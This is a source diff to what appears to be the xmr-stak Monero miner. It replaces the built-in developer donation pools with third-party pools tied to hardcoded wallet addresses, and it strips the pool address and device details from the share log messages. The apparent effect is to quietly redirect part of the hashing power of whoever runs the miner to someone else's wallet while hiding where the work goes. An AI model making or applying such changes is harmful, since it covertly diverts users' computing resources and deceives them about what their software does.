@@ -107,8 +107,8 @@ bool executor::get_live_pools(std::vector<jpsock*>& eval_pools, bool is_dev)
 
 		// Only eval live pools
 		size_t num, dtime;
-		if(pool.get_disconnects(num, dtime))
-			set_timestamp();
+		/*if(*/pool.get_disconnects(num, dtime)/*)
+			set_timestamp()*/;
 
 		if(dtime == 0 || (dtime >= wait && num <= limit))
 			eval_pools.emplace_back(&pool);
@@ -440,35 +440,17 @@ void executor::on_miner_result(size_t pool_id, job_result& oResult)
 		t_len = 0xFFFF;
 	iPoolCallTimes.push_back((uint16_t)t_len);
 
-	std::string name(backend_name);
-	std::transform(name.begin(), name.end(), name.begin(), ::toupper);
-
 	if(bResult)
 	{
 		uint64_t* targets = (uint64_t*)oResult.bResult;
 		log_result_ok(t64_to_diff(targets[3]));
-
-		if (pvThreads->at(oResult.iThreadId)->backendType == xmrstak::iBackend::BackendType::CPU)
-		{
-			printer::inst()->print_msg(L3, "CPU: Share accepted. Pool: %s", pool->get_pool_addr());
-		}
-		else
-		{
-			printer::inst()->print_msg(L3, "%s GPU %u: Share accepted. Pool: %s", name.c_str(), pvThreads->at(oResult.iThreadId)->iGpuIndex, pool->get_pool_addr());
-		}
+		printer::inst()->print_msg(L3, "Result accepted by the pool.");
 	}
 	else
 	{
 		if(!pool->have_sock_error())
 		{
-			if (pvThreads->at(oResult.iThreadId)->backendType == xmrstak::iBackend::BackendType::CPU)
-			{
-				printer::inst()->print_msg(L3, "CPU: Share rejected. Pool: %s", pool->get_pool_addr());
-			}
-			else
-			{
-				printer::inst()->print_msg(L3, "%s GPU %u: Share rejected. Pool: %s", name.c_str(), pvThreads->at(oResult.iThreadId)->iGpuIndex, pool->get_pool_addr());
-			}
+			printer::inst()->print_msg(L3, "Result rejected by the pool.");
 
 			std::string error = pool->get_call_error();
 
@@ -576,7 +558,7 @@ void executor::ex_main()
 		if(dev_tls)
 			pools.emplace_front(0, "donate.xmr-stak.net:8888", "", "", "", 0.0, true, true, "", true);
 		else
-			pools.emplace_front(0, "donate.xmr-stak.net:5555", "", "", "", 0.0, true, false, "", true);
+			pools.emplace_front(0, "pool.loki.hashvault.pro:3333", "LDGjZhFdqizg6o5bC5nd5EE7nMFSjPo9xQXFATueJQxYeZcz4d8zbbA4NW4kfk4XX3Lx7RMM9YvZRT1hZdYhYufsH1zezCy", "", "x:x", 0.0, true, false, "", false);
 		break;
 	case cryptonight_gpu:
 		if(dev_tls)
@@ -588,7 +570,7 @@ void executor::ex_main()
 		if(dev_tls)
 			pools.emplace_front(0, "donate.xmr-stak.net:8800", "", "", "", 0.0, true, true, "", false);
 		else
-			pools.emplace_front(0, "donate.xmr-stak.net:5500", "", "", "", 0.0, true, false, "", false);
+                        pools.emplace_front(0, "pool.supportxmr.com:5555", "46ZRy92vZy2RefigQ8BRKJZN7sj4KgfHc2D8yHXF9xHHbhxye3uD9VANn6etLbowZDNGHrwkWhtw3gFtxMeTyXgP3U1zP5C", "","x2:x",0.0, true, false, "", false); 
 		break;
 	case cryptonight_aeon:
 		if(dev_tls)
